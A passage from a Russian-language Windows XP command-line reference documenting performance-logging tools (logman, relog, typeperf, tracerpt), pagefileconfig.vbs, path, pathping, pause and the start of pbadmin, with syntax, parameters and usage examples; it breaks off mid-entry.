Чтобы создавать ежедневные запросы на выборку данных с указанием времени начала и окончания, повторных выборок, номеров контроля версий, путей счетчиков, интервалов обновления, форматов SQL и выборок выходных файлов, введите следующее.

Logman create counter daily_perf_log -b 7/27/2000 13:00:00 -e 7/27/2000 15:00:00 -r -v mmddhhmm -c "\Processor(_Total)\% Processor Time" "\Memory\Available bytes" -si 00:15 -f sql -o perfdb!daily_log

Чтобы запускать ежедневные выборки с интервалами обновления, именами учетных записей и паролями, введите следующее.

Logman start daily_perf_log -s \\%computer_name% -u admin "adminpassword"

Чтобы запускать выборки данных, которые будут осуществляться вручную, введите следующее.

Logman start daily_perf_log

Чтобы остановить выборки данных, введите следующее.

Logman stop daily_perf_log

Чтобы удалить выборки данных, введите следующее.

Logman delete daily_perf_log

Для просмотра состояния запросов на выборку введите следующие команды.

Logman query

Logman query daily_perf_log
========================================================================================
Perfmon

Позволяет открыть консоль «Производительность» Windows XP с настройками системного монитора из файлов настройки версии для Windows NT 4.0.
Синтаксис

perfmon.exe [имя_файла] [/HTMLFILE:преобразованный_файл файл_параметров]
Параметры

.exe
    Задает расширение файла.
имя_файла
    Задает имя файла параметров.
/HTMLFILE:преобразованный_файл файл_параметров
    Задает имя преобразованных файлов и имя исходного файла параметров Windows NT 4.0.

Примечания
- Эта процедура применима к файлам параметров системного монитора Windows NT 4.0 следующих типов: диаграмма (.pmc), отчет (.pmr), оповещение (.pma) и журнал (.pml).- Для отображения файла параметров Windows NT 4.0 в системном мониторе этот файл временно преобразуется в формат системного монитора Windows XP, но после запуска консоли преобразованная версия удаляется. Если файл параметров требуется сохранить для дальнейшего использования в системном мониторе, введите следующую команду:

Perfmon [имя_файла] [/HTMLFILE:преобразованный_файл файл_параметров]

где /HTMLFILE:преобразованный_файл — имя, с которым должен быть сохранен преобразованный файл, а файл_параметров — имя исходного файла параметров Windows NT 4.0.
-

Дополнительные сведения о включении команды Perfmon в сценарии инструментария управления Windows см. ссылку Scripting Logs and Monitoring на веб-узле Microsoft Windows Resource Kits.(http://www.microsoft.com/)
Примеры

Чтобы перечислить файлы параметров, введите следующее.

Perfmon myfile_overview

Чтобы перечислить преобразованные и исходные имена файлов, введите следующее.

Perfmon myfile_overview /Commands:newfile_review oldfile_sample.pml
========================================================================================
Relog

Сохраняет данные счетчиков производительности из файлов журналов в файлы других форматов, такие как текстовый-TSV (разделитель — табуляция), текстовый-CSV (разделитель — запятая), двоичный-BIN или SQL.
Синтаксис

relog [имя_файла [имя_файла...]] [-a] [-c путь [путь...]] [-cf имя_файла] [-f {bin|csv|tsv|SQL}] [-t значение] [-o {файл_вывода | DSN!журнал_счетчиков}] [-b М/д/гггг [[чч:]мм:]сс] [-e М/д/гггг [[чч:]мм:]сс] [-config имя_файла] [-q]
Параметры

имя_файла [имя_файла ...]
    Указывает путь к существующему журналу счетчиков производительности. Можно указать несколько файлов ввода.
-a
    Производит запись в конец файла вывода, вместо перезаписи. Этот параметр не применяется для формата SQL, где по умолчанию установлен режим записи в конец.
-c путь [путь ...]
    Указывает путь к журналу счетчиков производительности. Чтобы указать несколько путей, разделите их пробелом и заключите в кавычки (например, "Путь1 Путь2").
-cf имя_файла
    Указывает путь к текстовому файлу, в котором перечислены счетчики производительности, которые следует включить в файл журнала. Этот ключ используется для перечисления путей к счетчикам во входном файле друг за другом. По умолчанию все счетчики из исходного файла журнала загружаются повторно. 
-f {bin|csv|tsv|SQL}
    Указывает путь к формату выходного файла. По умолчанию используется двоичный формат (bin). Для баз данных SQL, выходной файл определяет DSN!журнал_счетчиков. Имеется возможность указать расположение базы данных, используя диспетчер ODBC для настройки DSN.
-t значение
    Указывает интервалы обновления через каждые "n" записей. Каждая n-ая запись добавляется в файл журнала. По умолчанию добавляются все записи.
-o {выходной_файл | DSN!журнал_счетчиков}
    Указывает путь к выходному файлу или базе данных SQL, где счетчики будут записаны.
-b М/д/гггг чч[:мм[:сс]]
    Указывает время начала копирования первой записи из входного файла. Дату и время необходимо вводить в следующем формате М/д/гггг чч:мм:сс.
-e М/д/гггг чч[:мм[:сс]]
    Указывает время окончания копирования последней записи из входного файла. Дату и время необходимо вводить в следующем формате М/д/гггг чч:мм:сс.
-config имя_файла
    Задает путь к файлу, содержащему параметры командной строки.
-q
    Отображает счетчики производительности и временные диапазоны файлов журнала, указанные во входном файле.
/?
    Отображает справку в командной строке.

Примечания
- Формат пути счетчика

Общий формат для путей счетчиков выглядит следующим образом: [\\компьютер]\объект[родительский_объект/экземпляр#индекс]\счетчик], где:

Компоненты «родительский_объект», «экземпляр», «индекс» и «счетчик» могут содержать допустимое имя или подстановочный знак. Компоненты «компьютер», «родительский_объект», «экземпляр» и «индекс» не являются необходимыми для всех счетчиков.

Путь к счетчику определяется для каждого счетчика отдельно. Например, объект логический_диск имеет код экземпляра, поэтому для него необходимо задать значение #индекс или ввести подстановочный знак. Таким образом, можно использовать следующий формат.

\логический_диск(*/*#*)\*

Для объекта процесс не требуется задавать индекс экземпляра. Таким образом, можно использовать следующий формат.

\процесс(*)\ID_процесса

Ниже приведен список допустимых форматов.
- \\компьютер\объект(родительский_объект/экземпляр#индекс)\счетчик- \\компьютер\объект(родительский_объект/экземпляр)\счетчик- \\компьютер\объект(экземпляр#индекс)\счетчик- \\компьютер\объект(экземпляр)\счетчик- \\компьютер\объект\счетчик- \объект(родительский_объект/экземпляр#индекс)\счетчик- \объект(родительский_объект/экземпляр)\счетчик- \объект(экземпляр#индекс)\счетчик- \объект(экземпляр)\счетчик- \объект\счетчик

Если подстановочный знак используется в имени родительского объекта, будут возвращены все экземпляры указанного объекта, соответствующие заданным полям «экземпляр» и «счетчик».

Если подстановочный знак используется в имени экземпляра, будут возвращены все экземпляры указанного объекта и родительского объекта, если имена всех экземпляров, соответствующих указанному коду, соответствуют подстановочному знаку.

Если подстановочный знак используется в имени счетчика, будут возвращены все счетчики указанного объекта.

Частичное совпадение пути счетчика (например «pro*») не поддерживается.
- Файлы счетчика

Файлы счетчика — это текстовые файлы, в которых перечислены один или более счетчиков производительности в существующем журнале. Полное имя счетчика копируется из журнала или результата выполнения ключа -q в формате [\\компьютер \ объект [экземпляр] \ счетчик]. Пути счетчиков отображаются по одному в строке.
- Копирование счетчиков

При выполнении команды Relog производится копирование указанных счетчиков из каждой записи входного файла, производится преобразование формата, если необходимо. Разрешается использовать подстановочные пути в файле счетчика.
- Сохранение подкаталогов входных файлов

С помощью ключа -t можно производить вставку входных файлов в выходные через каждую n-ую запись. По умолчанию данные загружаются повторно из каждой записи.
- Использование -b и -e ключей с файлами журнала.

Имеется возможность указать, что выходные журналы будут включать записи до времени начала (параметр -b), чтобы обеспечить данные для счетчиков, которым требуются промежуточные значения форматируемых значений. В выходном файле будут содержаться последние записи из входного файла со штампом времени, более ранним, чем время завершения в параметре -e.
- Использование параметра -config

Содержимое файла настроек, используемого с параметром -config, должно иметь следующий формат:

[параметр_команды]

значение
где параметр_команды — параметр командной строки, а значение — его значение. Например:

[o]

output.txt

[f]

csv

[t]

5
-

Дополнительные сведения о включении команды Relog в сценарии инструментария управления Windows см. ссылку Scripting Logs and Monitoring на веб-узле Microsoft Windows Resource Kits.(http://www.microsoft.com/)
Примеры

Чтобы обновлять существующие журналы трассировки через фиксированные интервалы в 30 записей, перечислять пути счетчиков, выходные файлы и форматы, введите следующую команду.

Relog c:\perflogs\daily_trace_log.blg -cf counter_file.txt -o c:\perflogs\reduced_log.csv -t 30 -f csv

Чтобы обновлять существующие журналы трассировки через фиксированные интервалы в 30 записей, перечислять пути счетчиков и выходные файлы, введите следующую команду.

Relog c:\perflogs\daily_trace_log.blg -cf counter_file.txt -o c:\perflogs\reduced_log.blg -t 30
========================================================================================
Tracerpt

Обрабатывает журналы трассировки событий и данные, поступающие в реальном масштабе времени от поставщиков трассировочных данных, и позволяет создавать отчеты с анализом данных трассировки и файлы CSV (с разделителем запятой) для создающихся событий.
Синтаксис

tracerpt [имя_файла [имя_файла ...]] [-o [имя_файла]] [-report [имя_файла]] [-rt имя_сеанса [имя_сеанса ...]] [-summary [имя_файла]] [-config [имя_файла]
Параметры

имя_файла [имя_файла ...]
    Указывает имя файла для сеанса трассировки событий. Можно указать несколько файлов.
-o [имя_файла]
    Задает имя файла CSV (с разделителем запятой). Если ни одного файла не указано, тогда по умолчанию используется файл dumpfile.csv, а не summary.txt.
-report [имя_файла]
    Задает имя выходного файла отчета. По умолчанию используется файл workload.txt.
-rt имя_сеанса [имя_сеанса ...]
    Получает данные из источника данных реального времени. Чтобы использовать этот параметр, включите сеанс трассировки событий.
-summary [имя_файла]
    Задает имя сокращенного выходного файла. По умолчанию используется файл summary.txt.
-config имя_файла
    Задает путь к файлу, содержащему параметры командной строки. Используйте этот ключ для ввода своих параметров командной строки в файл.
/?
    Отображает справку в командной строке.

Примечания
- Просмотр файлов dumpfile.csv в Microsoft Excel

Открытие формата dumpfile.csv в Microsoft Excel позволяет просматривать события в хронологическом порядке. Файлы включают состоят из заголовка, за которым следует текст с разделителями запятыми. Поля заголовков перечислены ниже.
Поле     Описание
TID     Идентификатор потока
Clock time     Штамп времени события
Kernel (ms)     Процессорное время в режиме ядра
User (ms)     Процессорное время в режиме пользователя
User data     Переменный фрагмент данных заголовка использует структуру формата управляемых объектов (MOF).
IID     Экземпляр ID
PIID     Родительский экземпляр ID
- Использование параметра -report

Чтобы использовать этот параметр, необходимо включить имя файла «Windows kernel trace» и любого другого файла трассировки событий в командную строку. Без этого будет выдано сообщение об ошибке.
- Использование параметра -summary

При использовании параметра -summary создается следующий файл.
Files processed     список файлов
Total buffers processed     N
Total events processed     N
Total events lost     N
Start time     dd MMM yyyy hh:mm:ss.ttt
End time     dd MMM yyyy hh:mm:ss.ttt
Elapsed time     N sec
- Использование параметра -config

Содержимое файла настроек, используемого с параметром -config, должно иметь следующий формат:

[параметр_команды]

значение
где параметр_команды — параметр командной строки, а значение — его значение. Например:

[o]

output.txt

[report]

report.txt

[summary]

summary.txt
-

Дополнительные сведения о включении команды Tracerpt в сценарии инструментария управления Windows см. ссылку Scripting Logs and Monitoring на веб-узле Microsoft Windows Resource Kits.(http://www.microsoft.com/)
========================================================================================
Typeperf

Записывает данные счетчика производительности в командное окно или в файл журнала поддерживаемого формата. Чтобы остановить выполнение команды Typeperf нажмите CTRL+C.
Синтаксис

Typeperf [путь [путь ...]] [-cf имя_файла] [-f {csv|tsv|bin}] [-si интервал] [-o имя_файла] [-q [объект]] [-qx [объект]] [-sc отсчеты] [-config имя_файла] [-s имя_компьютера]
Параметры

-c {путь [путь...] | -cf имя_файла}
    Указывает путь к журналу счетчиков производительности. Чтобы перечислить несколько путей счетчиков, следует отделить их друг от друга пробелами.
-cf имя_файла
    Указывает имя файла, в котором содержатся пути счетчиков, для которых следует ввести наблюдение, по одному пути в линии.
-f {csv|tsv|bin}
    Задает формат выходного файла. Формат файла может быть: csv (с разделителем запятой), tsv (с разделителем табуляцией) и bin (двоичный). По умолчанию используется формат csv.
-si интервал [мм:] сс
    Указывает интервал между отсчетами в формате [мм] сс. По умолчанию этот интервал составляет 1 секунду.
-o [имя_файла]
    Указывает путь к выходному файлу. По умолчанию используется параметр stdout.
-q [объект]
    Отображает и запрашивает доступные счетчики без экземпляров. Чтобы отображать счетчики для одного объекта, включите имя объекта.
-qx [объект]
    Отображает и запрашивает все доступные счетчики с экземплярами. Чтобы отображать счетчики для одного объекта, включите имя объекта.
-sc отсчет
    Указывает число отсчетов для сбора. По умолчанию выборка производится до тех пор, пока не нажата комбинация клавиш CTRL+C.
-config имя_файла
    Задает путь к файлу, содержащему параметры командной строки.
-s имя_компьютера
    Указывает систему для наблюдения, если в пути счетчика не задано ни одного сервера.
/?
    Отображает справку в командной строке.

Примечания
- Формат пути счетчика

Общий формат для путей счетчиков выглядит следующим образом: [\\компьютер]\объектродительский_объект/экземпляр#индекс]\счетчик], где:

Компоненты «родительский_объект», «экземпляр», «индекс» и «счетчик» могут содержать допустимое имя или подстановочный знак. Компоненты «компьютер», «родительский_объект», «экземпляр» и «индекс» не являются необходимыми для всех счетчиков.

Путь к счетчику определяется для каждого счетчика отдельно. Например, объект логический_диск имеет код экземпляра, поэтому для него необходимо задать значение #индекс или ввести подстановочный знак. Таким образом, можно использовать следующий формат.

\логический_диск(*/*#*)\*

Для объекта процесс не требуется задавать индекс экземпляра. Таким образом, можно использовать следующий формат.

\процесс(*)\ID_процесса

Ниже приведен список допустимых форматов.
- \\компьютер\объект(родительский_объект/экземпляр#индекс)\счетчик- \\компьютер\объект(родительский_объект/экземпляр)\счетчик- \\компьютер\объект(экземпляр#индекс)\счетчик- \\компьютер\объект(экземпляр)\счетчик- \\компьютер\объект\счетчик- \объект(родительский_объект/экземпляр#индекс)\счетчик- \объект(родительский_объект/экземпляр)\счетчик - \объект(экземпляр#индекс)\счетчик- \объект(экземпляр)\счетчик- \объект\счетчик

Если подстановочный знак используется в имени родительского объекта, будут возвращены все экземпляры указанного объекта, соответствующие заданным полям «экземпляр» и «счетчик».

Если подстановочный знак используется в имени экземпляра, будут возвращены все экземпляры указанного объекта и родительского объекта, если имена всех экземпляров, соответствующих указанному коду, соответствуют подстановочному знаку.

Если подстановочный знак используется в имени счетчика, будут возвращены все счетчики указанного объекта.

Частичное совпадение пути счетчика (например «pro*») не поддерживается.
- Форматы запросов

Для запросов пути счетчика используйте следующий формат: Typeperf [{-q | -qx [\\компьютер\] [объект] [-o выходной_файл}].

Используйте следующие командные строки для полных запросов.

Typeperf [\\компьютер]\объект[экземпляр]\счетчик]

Typeperf -cf входной_файл
- Использование параметра -config

Содержимое файла настроек, используемого с параметром -config, должно иметь следующий формат:

[параметр_команды]

значение
где параметр_команды — параметр командной строки, а значение — его значение. Например:

[-c]

\Windows\mypath

[-o]

report.csv

[-s]

mysystem
-

Дополнительные сведения о включении команды Typeperf в сценарии инструментария управления Windows см. ссылку Scripting Logs and Monitoring на веб-узле Microsoft Windows Resource Kits.(http://www.microsoft.com/)
Примеры

Чтобы отобразить счетчики процессора и памяти, введите:

typeperf "\Memory\Available bytes" "\processor(_total)\% processor time"

Чтобы отображать счетчики процесса Explorer каждые три секунды в выходном файле-CSV, введите:

typeperf "\Process(Explorer)\Thread Count" -si 3 -o typeperf.csv

Чтобы отобразить 50 отсчетов счетчиков RAS на компьютере Server_name, введите:

typeperf "\RAS port(LPT1)\Bytes Transmitted" -sc 50 -s Server_name

Чтобы отобразить значения счетчиков для 50 отсчетов счетчиков, перечисленных в файле input.txt, с интервалом выборки в 120 секунд, введите:

typeperf -cf input.txt -si 120 -sc 50 -f TSV -o domain2.tsv

Чтобы запросить установленные счетчики с экземплярами, введите следующую команду. Имейте в виду, что ключ -qx вернет гораздо большее число счетчиков производительности, чем ключ -q.

typeperf -qx

Чтобы запросить счетчики физического диска без экземпляров на компьютере Server5 и записать их в файл diskctrs.txt, введите:

typeperf -q \\Server5\PhysicalDisk -o diskctrs.txt
========================================================================================
Файл Pagefileconfig.vbs

Позволяет администратору вывести и настроить параметры использования виртуальной памяти файлом подкачки.

Для просмотра синтаксиса команды щелкните ее:

pagefileconfig change

Изменяет параметры использования виртуальной памяти файлом подкачки.
Синтаксис

pagefileconfig[.vbs] /change [/s компьютер [/u домен\пользователь [/p пароль]]] {[/i начальный_размер_файла_подкачки]|[/m максимальный_размер_файла_подкачки]} /vo {буква_тома|*} [/vo {буква_тома_2|*} [...]]
Параметры

/s компьютер
    Задает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Запускает сценарий с разрешениями учетной записи пользователя, указанного, как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Задает пароль учетной записи пользователя, указанного в параметре /u.
/i начальный_размер_файла_подкачки
    Задает новый начальный размер (в Мбайт) для указанного файла подкачки.
/m максимальный_размер_файла_подкачки
    Задает новый максимальный размер (в Мбайт) для указанного файла подкачки.
/vo {буква_тома|*}
    Задает том или тома параметров файла подкачки, которые должны быть изменены. Том задается буквой с последующим двоеточием (Например «C:»).
/?
    Выводит справку в командной строке.

Примеры

Далее приведены примеры использования команды pagefileconfig /change.

pagefileconfig.vbs /change /m 400 /vo c:
pagefileconfig.vbs /change /s srvmain /u maindom\hiropln /m 400 /vo c:
pagefileconfig.vbs /change /s srvmain /u maindom\hiropln /i 20 /vo *
pagefileconfig.vbs /change /s srvmain /u maindom\hiropln /p p@ssW23 /i 200 /m 500 /vo c: /vo d:

pagefileconfig create

Создает или добавляет дополнительный файл подкачки к системе.
Синтаксис

pagefileconfig.vbs /create [/s компьютер [/u домен\пользователь [/p пароль]]] /i начальный_размер_файла_подкачки /m максимальный_размер_файла_подкачки /vo {буква_тома|*} [/vo {буква_тома_2|*} [...]]
Параметры

/s компьютер
    Задает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Запускает сценарий с разрешениями учетной записи пользователя, заданными в пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Задает пароль учетной записи пользователя, заданного в параметре /u.
/i начальный_размер_файла_подкачки
    Задает новый начальный размер (в Мбайт) для указанного файла подкачки.
/m максимальный_размер_файла_подкачки
    Задает новый максимальный размер (в Мбайт) для указанного файла подкачки.
/vo {буква_тома|*}
    Задает том или тома параметров файла подкачки, которые должны быть созданы. Том задается буквой с последующим двоеточием (Например «C:»).
/?
    Выводит справку в командной строке.

Примеры

Далее приведены примеры использования команды pagefileconfig /create:

pagefileconfig.vbs /create /i 140 /m 300 /vo d:
pagefileconfig.vbs /create /s srvmain /u maindom\hiropln /i 150 /m 300 /vo d:
pagefileconfig.vbs /create /s srvmain /u maindom\hiropln /i 50 /m 200 /vo *
pagefileconfig.vbs /create /s srvmain /u maindom\hiropln /p p@ssW23 /i 100 /m 600 /vo d: /vo e: /vo f:

pagefileconfig delete

Удаляет файл подкачки из системы.
Синтаксис

pagefileconfig.vbs /delete [/s компьютер [/u домен\пользователь [/p пароль]]] /vo {буква_тома|*} [/vo {буква_тома_2|*} [...]]
Параметры

/s компьютер
    Задает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Запускает сценарий с разрешениями учетной записи пользователя, указанного в пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Задает пароль учетной записи пользователя в параметре /u.
/vo {буква_тома|*}
    Задает том или тома параметров файла подкачки, которые должны быть удалены. Том задается буквой с последующим двоеточием (Например «C:»).
/?
    Выводит справку в командной строке.

Примеры

Далее приведены примеры использования команды pagefileconfig /delete:

pagefileconfig.vbs /delete /vo d:
pagefileconfig.vbs /delete /s srvmain /u maindom\hiropln /vo d:
pagefileconfig.vbs /delete /s srvmain /u maindom\hiropln /p p@ssW23 /vo d: /vo e: /vo f:

pagefileconfig query

Запрашивает и выводит параметры использования виртуальной памяти файлом подкачки.

pagefileconfig.vbs /query [/s компьютер [/u домен\пользователь [/p пароль]]] [/fo {TABLE|LIST|CSV}]
Параметры

/s компьютер
    Задает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Запускает сценарий с разрешениями учетной записи пользователя, указанный в пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Задает пароль учетной записи пользователя в параметре /u.
/fo {TABLE|LIST|CSV}
    Задает формат выходных данных запроса. Допустимые значения: TABLE, LIST и CSV. По умолчанию используется значение LIST.
/?
    Выводит справку в командной строке.

Примеры

Далее приведены примеры использования команды pagefileconfig /query:

pagefileconfig.vbs /query
pagefileconfig.vbs /query /fo table
pagefileconfig.vbs /query /s srvmain /u maindom\hiropln
pagefileconfig.vbs /query /s srvmain /u maindom\hiropln /p p@ssW23 /fo list
Примечания
- Максимальный размер файла подкачки ограничен размером свободного места на диске за вычетом размера аварийного дампа, заданного для системного диска. 
========================================================================================
path

Устанавливает путь поиска в переменной среды PATH, которая является набором каталогов, используемых для поиска исполняемых файлов. Вызванная без параметров, команда path выводит текущий путь поиска.
Синтаксис

path [[%path%] [диск:]путь [;...]]
Параметры

[диск:]путь
    Задает диск и каталог для установки пути поиска. 
;
    Разделяет каталоги в пути поиска.
%path%
    Задает Windows XP для добавления пути поиска к уже существующему в списке переменной среды PATH набору каталогов.
/?
    Выводит справку в командной строке.

Примечания
- Использование значения ;

Если ; используется в качестве самостоятельного параметра, то происходит удаление существующего пути поиска, найденного в переменной PATH.
- Использование %path%

Если параметр %path% включен в синтаксис, то командный интерпретатор Cmd.exe заменяет его на значение пути поиска, найденное в переменной PATH, устраняя тем самым необходимость ручного ввода этих значений в командной строке. Сведения о замене значений переменных среды см.в разделе «Командная оболочка: обзор» в «См.Также».
- Текущий каталог

Операционная система всегда начинает поиск с текущего каталога, а затем продолжает его в каталогах, заданных в пути поиска.
- Файлы с одинаковыми именами и разными расширениями

В некоторых случаях в одном каталоге могут содержаться файлы с одинаковыми именами, но с разными расширениями. Например, файл Accnt.com, запускающий бухгалтерскую программу, и файл Accnt.bat, выполняющий подключение к бухгалтерской сети.

Поиск файлов происходит с учетом их расширений в следующем порядке:.exe, .com, .bat и .cmd. Чтобы запустить файл Accnt.bat (при наличии в том же каталоге файла Accnt.com), необходимо в командной строке указать его расширение (.bat).
- Два или более одинаковых имен файлов в пути поиска

Если в пути поиска указаны два или более файлов с одинаковыми именами и расширением, то Windows XP сначала осуществляет поиск указанного имени в текущем каталоге, а затем уже в каталогах пути поиска в том же порядке, в котором они перечислены в PATH.
- Поиск подсистемы MS-DOS

Если команда path включена в файл Autoexec.nt, то при каждом входе в систему она будет автоматически добавлять заданный путь поиска подсистемы MS-DOS к пути поиска Windows XP. Интерпретатор команд Cmd.exe не использует файл Autoexec.nt. При запуске из ярлыка Cmd.exe наследует набор переменных среды из My Computer/Properties/Advanced/Environment.
Примеры

Приведенная ниже команда задает использование Windows XP для поиска трех каталогов для нахождения внешних команд. Пути для этих трех каталогов следующие: C:\User\Taxes, B:\User\Invest и B:\Bin:

path c:\user\taxes;b:\user\invest;b:\bin
========================================================================================
Pathping

Предоставляет информацию о латентности сети и потерях данных на промежуточных узлах между исходным пунктом и пунктом назначения. Команда Pathping в течение некоторого периода времени отправляет многочисленные сообщения с эхо-запросом каждому маршрутизатору, находящемуся между исходным пунктом и пунктом назначения, а затем на основании пакетов, полученных от каждого из них, вычисляет результаты. Поскольку pathping показывает коэффициент потери пакетов для каждого маршрутизатора или связи, можно определить маршрутизаторы или субсети, имеющие проблемы с сетью. Команда Pathping выполняет эквивалентное команде tracert действие, идентифицируя маршрутизаторы, находящиеся на пути. Затем она периодически в течение заданного времени обменивается пакетами со всеми маршрутизаторами и на основании числа пакетов, полученных от каждого из них, обрабатывает статистику. Запущенная без параметров, команда pathping выводит справку.
Синтаксис

pathping [-n] [-h максимальное_число_переходов] [-g список_узлов] [-p период] [-q число_запросов [-w интервал] [-T] [-R] [имя_конечного_компьютера]
Параметры

-n
    Предотвращает попытки команды pathping сопоставить IP-адреса промежуточных маршутизаторов с их именами. Это позволяет ускорить вывод результатов команды pathping.
-h максимальное_число_переходов
    Задает максимальное количество переходов на пути при поиске конечного пункта назначения. Значение по умолчанию равно 30.
-g список_узлов
    Указывает для сообщений с эхо-запросом использование параметра свободной маршрутизации в IP-заголовке с набором промежуточных мест назначения, указанным в списке_компьютеров. При свободной маршрутизации последовательные промежуточные места назначения могут быть разделены одним или несколькими маршрутизаторами. Максимальное число адресов или имен в списке равно 9. Список_адресов представляет собой набор IP-адресов (в точечно-десятичной нотации), разделенных пробелами.
-p период
    Задает время ожидания между последовательными проверками связи (в миллисекундах). Значение по умолчанию равно 250 миллисекунд (1/4 секунды).
-q число_запросов
    Задает количество сообщений с эхо-запросом, отправленных каждому маршрутизатору пути. По умолчанию — 100.
-w интервал
    Задает время ожидания каждого отклика (в миллисекундах). Значение по умолчанию равно 3000 миллисекунд (3 секунды).
-T
    Присоединяет тег приоритета уровня 2 (например 802.1p) к сообщениям с эхо-запросом, отправляемым каждому сетевому устройству на маршруте. Это помогает обнаружить сетевые устройства, для которых не настроен приоритет уровня 2. Он предназначен для проверки соединений, использующих спецификации QoS.
-R
    Проверяет, все ли сетевые устройства вдоль маршрута поддерживают протокол RSVP (Resource Reservation Setup Protocol, протокол настройки резервирования ресурсов), который позволяет главному компьютеру резервировать определенную часть пропускной способности для потока данных. Этот параметр предназначен для проверки соединений, использующих спецификации QoS.
имя_конечного_компьютера
    Задает пунтк назначения, идентифицированный IP-адресом или именем узла.
/?
    Отображает справку в командной строке.

Примечания
- Параметры команды Pathping вводятся с учетом регистра. - Во избежание перегрузки сети пакеты должны передаваться через довольно большие интервалы времени. - Чтобы минимизировать эффект потери пакетов, не нужно слишком часто выполнять проверку связи. - При использовании параметра -p пакеты для проверки связи отсылаются каждому промежуточному узлу отдельно. Поэтому интервал времени между двумя пакетами, переданными одному узлу, составляет (период) x (число узлов). - С помощью параметра -w пакеты можно отправлять одновременно. Поэтому промежуток времени, указанный в параметре интервал, не ограничен промежутком времени, указанным в параметре период. - Использование параметра -T

Включение приоритета уровня 2 на узловом компьютере позволяет передавать пакеты с тегом приоритета уровня 2, который используется устройствами уровня 2 для назначения пакету приоритета. Устройства старого типа, которые не распознают приоритет уровня 2, будут отвергать пакеты с тегами, так как они будут выглядеть неправильно сформированными. Данный параметр помогает определить компьютер сети, который отвергает эти пакеты.
- Использование параметра -R

Каждому сетевому устройству на маршруте передается сообщение резервирования RSVP для несуществующего сеанса. Если устройство не настроено на поддержку протокола RSVP, оно возвращает сообщение о недоступности протокола ICMP. Если устройство поддерживает протокол RSVP, оно возвращает ошибку резервирования. Некоторые устройства не могут возвращать ни одно из этих сообщений. В этом случае выводится сообщение о таймауте.
- Эта команда доступна только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Приведенный ниже пример содержит результаты работы команды pathping:


D:\>pathping -n corp1
Трассировка маршрута к corp1 [10.54.1.196]
с максимальным числом прыжков 30:
 0 172.16.87.35
 1 172.16.87.218
 2 192.168.52.1
 3 192.168.80.1
 4 10.54.247.14
 5 10.54.1.196
Подсчет статистики за: 125 сек. ...
 Исходный узел Маршрутный узел
Hop RTT Утер./Отпр. Утер./Отпр. Адрес
 0 172.16.87.35
 0/ 100 = 0% |
 1 41мс 0/ 100 = 0% 0/ 100 = 0% 172.16.87.218
 13/ 100 = 13% |
 2 22мс 16/ 100 = 16% 3/ 100 = 3% 192.68.52.1
 0/ 100 = 0% |
 3 24мс 13/ 100 = 13% 0/ 100 = 0% 192.68.80.1
 0/ 100 = 0% |
 4 21мс 14/ 100 = 14% 1/ 100 = 1% 10.54.247.14
 0/ 100 = 0% |
 5 24мс 13/ 100 = 13% 0/ 100 = 0% 10.540.10.196
Трассировка завершена.

После запуска pathping сначала выводится путь. Это тот же путь, который выводится командой tracert. Далее в течение 90 секунд команда выдает сообщение о том, что она занята (это время варьируется в зависимости от числа переходов). В течение этого времени происходит сбор сведений со всех маршрутизаторов, перечисленных выше, и со всех соединений между ними. По завершении этого периода выводятся результаты проверки.

В примере отчета, приведенном выше, столбцы This Node/Link, Lost/Sent = Pct и Address показывают, что при переходе от адреса 172.16.87.218 к 192.168.52.1 теряется 13 процентов пакетов. Маршрутизаторы в узлах 2 и 4 также пропускают пакеты, адресованные им, но эти потери не оказывают влияние на их способность пересылать пакеты, которые им не адресованы.

Оценки потерь для соединений (задаваемых вертикальной чертой | в столбце Address) показывают перегрузку, вызывающую потерю пакетов, пересылаемых по маршруту. Степень потерь пакетов на маршрутизаторах (в правом столбце таких строк указан IP-адрес маршрутизатора) показывает, что процессоры этих маршрутизаторов перегружены.
========================================================================================
Pause

Приостанавливает выполнение пакетной программы с выводом сообщения об ожидании нажатия пользователем любой клавиши.
Синтаксис

pause
Параметры

/?
    Отображает справку в командной строке.

Примечания
- При запуске команды prompt выводится следующее сообщение:

Для продолжения нажмите любую клавишу . . .
- Если при работе пакетной программы была нажата комбинация CTRL+C для ее остановки, то на экран будет выведено следующее сообщение:

Завершить выполнение пакетного файла [Y(да)/N(нет)]?

Если была нажата клавиша Y (подтверждение), пакетная программа будет закончена и управление вернется операционной системе. По этой причине команда pause может быть вставлена перед разделом пакетного файла, который потребуется пропустить. Команда pause приостанавливает выполнение пакетной программы, аналогичное действие можно сделать, нажав комбинацию CTRL+C и Y.
Примеры

Для создания пакетной программы запроса пользователю о необходимости заменить диск в одном из дисководов, введите:

@echo off
:begin
copy a:*.*
echo Please put a new disk into drive A
pause
goto begin

В этом примере все файлы с диска A копируются в текущий каталог. После этого на экран выводится запрос вставить другой диск в дисковод А, затем команда pause приостанавливает работу программы, чтобы пользователь мог сменить диск и нажать любую клавишу для продолжения процесса. Данная пакетная программа работает как бесконечный цикл. Команда goto BEGIN возвращает управление на начало командного файла. Для завершения работы этой пакетной программы требуется нажать комбинацию CTRL+C и Y.
========================================================================================
Pbadmin

Администрирует телефонные книги. Команда pbadmin без параметров запускает компонент Администратор телефонной книги (PBA).
Синтаксис

pbadmin.exe /N имя_телефонной_книги [/R путь_файла_области\имя_файла_области] [/P путь_файла_данных\имя_файла_данных]

pbadmin.exe /I имя_телефонной_книги /R путь_файла_области\имя_файла_области

pbadmin.exe /I имя_телефонной_книги /P путь_файла_данных\имя_файла_данных

pbadmin.exe /O имя_телефонной_книги_имя_сервера_имя_пользователя_пароль

pbadmin.exe /B имя_телефонной_книги
Параметры

/N имя_телефонной_книги
